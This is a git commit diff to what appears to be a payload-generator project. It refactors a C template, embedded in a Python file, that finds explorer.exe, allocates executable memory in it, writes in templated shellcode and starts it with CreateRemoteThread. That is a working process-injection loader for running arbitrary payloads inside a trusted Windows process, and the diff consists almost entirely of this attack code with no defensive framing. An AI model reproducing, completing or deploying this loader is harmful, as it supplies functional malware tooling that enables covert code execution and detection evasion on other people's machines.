20203b09ef98ecdb126363bf40ce17c350f9fe13
Bill Chenyoung <bchenyoung@gmail.com>
2026-07-14 10:14:46 +1000

    refactored processinject template

--- c/templates/processinject.py
+++ c/templates/processinject.py
@@ -66,14 +66,46 @@ int main(void) {{
     {shellcode}
     {transformers}
 
-    pid = FindPID("explorer.exe");
+    HANDLE hProcSnap;
+    PROCESSENTRY32 pe32;
+            
+    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
+            
+    pe32.dwSize = sizeof(PROCESSENTRY32); 
+            
+    if (!Process32First(hProcSnap, &pe32)) {{
+            CloseHandle(hProcSnap);
+            return 0;
+    }}
+            
+    while (Process32Next(hProcSnap, &pe32)) {{
+        if (lstrcmpiA("explorer.exe", pe32.szExeFile) == 0) {{
+                pid = pe32.th32ProcessID;
+                break;
+        }}
+    }}
+            
+    CloseHandle(hProcSnap);
 
     // try to open target process
     hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
         PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
         FALSE, (DWORD) pid);
 
-    Inject(hProc, shellcode, {shellcodeSize});
+    LPVOID pRemoteCode = NULL;
+    HANDLE hThread = NULL;
+
+    pRemoteCode = VirtualAllocEx(hProc, NULL, {shellcodeSize}, MEM_COMMIT, PAGE_EXECUTE_READ);
+    WriteProcessMemory(hProc, pRemoteCode, (PVOID)shellcode, (SIZE_T){shellcodeSize}, (SIZE_T *)NULL);
+    
+    hThread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
+    if (hThread != NULL) {{
+        WaitForSingleObject(hThread, 500);
+        CloseHandle(hThread);
+        return 0;
+    }}
+
     CloseHandle(hProc);
     return 0;
 }}
